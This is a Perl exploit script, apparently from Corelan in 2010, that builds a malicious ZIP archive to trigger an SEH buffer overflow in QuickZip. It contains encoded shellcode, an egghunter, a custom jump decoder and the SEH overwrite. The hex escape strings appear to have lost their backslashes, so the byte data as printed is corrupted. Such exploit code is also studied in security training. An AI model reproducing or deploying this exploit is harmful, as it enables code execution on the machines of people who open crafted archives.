# Author : corelanc0d3r
# http://www.corelan.be:8800
# March 2010

my $filename="corelanboom.zip";
my $ldf_header = "x50x4Bx03x04x14x00x00x00x00x00".
"xB7xACxCEx34x00x00x00x00x00x00x00x00x00x00x00" .
"xe4x0f" .# file size
"x00x00x00";

my $cdf_header = "x50x4Bx01x02x14x00x14x00x00x00".
"x00x00xB7xACxCEx34x00x00x00".
"x00x00x00x00x00x00x00x00x00".
"xe4x0f". # file size
"x00x00x00x00x00x00x01x00".
"x24x00x00x00x00x00x00x00";

my $eofcdf_header = "x50x4Bx05x06x00x00x00x00x01x00x01x00".
"x12x10x00x00". # Size of central directory (bytes)
"x02x10x00x00". # Offset of start of central directory, relative to
                    # start of archive
"x00x00";

my $shellcode = "x89xe7xd9xe5xd9x77xf4x58x50x59x49x49x49x49" .
"x43x43x43x43x43x43x51x5ax56x54x58x33x30x56" .
"x58x34x41x50x30x41x33x48x48x30x41x30x30x41" .
"x42x41x41x42x54x41x41x51x32x41x42x32x42x42" .
"x30x42x42x58x50x38x41x43x4ax4ax49x49x49x4a" .
"x4bx4dx4bx49x49x43x44x51x34x4ax54x50x31x48" .
"x52x4ex52x42x5ax46x51x49x59x42x44x4cx4bx42" .
"x51x46x50x4cx4bx43x46x44x4cx4cx4bx43x46x45" .
"x4cx4cx4bx47x36x43x38x4cx4bx43x4ex51x30x4c" .
"x4bx46x56x50x38x50x4fx42x38x43x45x4cx33x46" .
"x39x43x31x48x51x4bx4fx4bx51x43x50x4cx4bx42" .
"x4cx51x34x47x54x4cx4bx50x45x47x4cx4cx4bx46" .
"x34x45x55x44x38x45x51x4ax4ax4cx4bx51x5ax44" .
"x58x4cx4bx50x5ax47x50x43x31x4ax4bx4bx53x47" .
"x47x51x59x4cx4bx50x34x4cx4bx43x31x4ax4ex46" .
"x51x4bx4fx46x51x4fx30x4bx4cx4ex4cx4bx34x49" .
"x50x44x34x44x4ax4fx31x48x4fx44x4dx43x31x49" .
"x57x4bx59x4ax51x4bx4fx4bx4fx4bx4fx47x4bx43" .
"x4cx47x54x51x38x43x45x49x4ex4cx4bx51x4ax46" .
"x44x43x31x4ax4bx42x46x4cx4bx44x4cx50x4bx4c" .
"x4bx51x4ax45x4cx43x31x4ax4bx4cx4bx44x44x4c" .
"x4bx43x31x4bx58x4bx39x47x34x46x44x45x4cx43" .
"x51x4fx33x48x32x43x38x46x49x4ex34x4cx49x4d" .
"x35x4cx49x49x52x42x48x4cx4ex50x4ex44x4ex4a" .
"x4cx51x42x4dx38x4dx4cx4bx4fx4bx4fx4bx4fx4b" .
"x39x50x45x43x34x4fx4bx43x4ex48x58x4bx52x42" .
"x53x4dx57x45x4cx46x44x51x42x4dx38x4cx4bx4b" .
"x4fx4bx4fx4bx4fx4cx49x51x55x43x38x43x58x42" .
"x4cx42x4cx47x50x4bx4fx43x58x46x53x50x32x46" .
"x4ex43x54x45x38x44x35x43x43x43x55x44x32x4d" .
"x58x51x4cx46x44x44x4ax4bx39x4dx36x46x36x4b" .
"x4fx50x55x45x54x4dx59x48x42x50x50x4fx4bx4f" .
"x58x4ex42x50x4dx4fx4cx4bx37x45x4cx51x34x50" .
"x52x4dx38x51x4ex4bx4fx4bx4fx4bx4fx42x48x42" .
"x4cx43x51x42x4ex50x58x42x48x51x53x42x4fx44" .
"x32x45x35x50x31x49x4bx4cx48x51x4cx51x34x43" .
"x37x4cx49x4ax43x43x58x42x4fx44x32x43x43x50" .
"x58x42x48x42x49x43x43x42x49x44x34x42x48x42" .
"x4fx42x47x51x30x51x46x45x38x45x33x47x50x51" .
"x52x42x4cx45x38x42x46x45x36x44x33x45x35x45" .
"x38x42x4cx42x4cx47x50x50x4fx43x58x44x34x42" .
"x4fx47x50x45x31x45x38x51x30x43x58x45x39x47" .
"x50x43x58x43x43x45x31x42x59x43x43x42x48x42" .
"x4cx43x51x42x4ex47x50x43x58x50x43x42x4fx44" .
"x32x42x45x50x31x49x59x4bx38x50x4cx51x34x46" .
"x4bx4cx49x4bx51x46x51x49x42x46x32x46x33x46" .
"x31x51x42x4bx4fx4ex30x46x51x4fx30x46x30x4b" .
"x4fx46x35x44x48x45x5ax41x41";
my $size=4064;
#egghunter using edx as basereg
my $egghunter="JJJJJJJJJJJRYVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8A".
"CJJIU6MQ9ZKO4OG2V2SZ4BV8HMFNGL5UQJD4ZONXRWP0P02TLKJZNOT5ZJNO3EKWKOM7A";

#custom decoder which will reproduce 8 bytes of code on the stack
#reproduced code will perform add edx,0x43B  and then jmp edx
#so it would jump to our alpha2 encoded egg hunter
my $buildjmp = "x61x53x5c".
"x25x4Ax4Dx4Ex55".
"x25x35x32x31x2A".
"x2dx55x55x55x5F".
"x2dx55x55x55x5F".
"x2dx56x55x56x5E".
"x50".
"x25x4Ax4Dx4Ex55".
"x25x35x32x31x2A".
"x2dx2Ax69x41x54".
"x2dx2Ax69x41x54".
"x2dx2Bx6Bx41x53".
"x50";

#hit next SEH after 297 bytes
my $junk = "x41" x (297-length($egghunter)-length($buildjmp)-8);
# nseh : jump back 10 bytes
my $nseh="x73xf9xffxff";
# SE Handler : ppr from quickzip.exe :
my $seh=pack('V',0x0040322B);

#add some nops.  A (0x41 will act as nop)
my $nops = "A" x 30;
#write the custom decoder before nseh, and shellcode after the nops
my $payload = $egghunter.$junk.$buildjmp."AAAAAAAA".$nseh.$seh.$nops."w00tw00t".$shellcode;

# fill up to 4064 bytes and add .txt file extension
my $restsize = $size - length($payload);
my $rest = "D" x $restsize;
$payload = $payload . $rest. ".txt";    

print "Size : " . length($payload)."n";
print "Removing old $filename filen";
system("del $filename");
print "Creating new $filename filen";
open(FILE, ">$filename");
print FILE $ldf_header . $payload . $cdf_header . $payload . $eofcdf_header;
close(FILE);
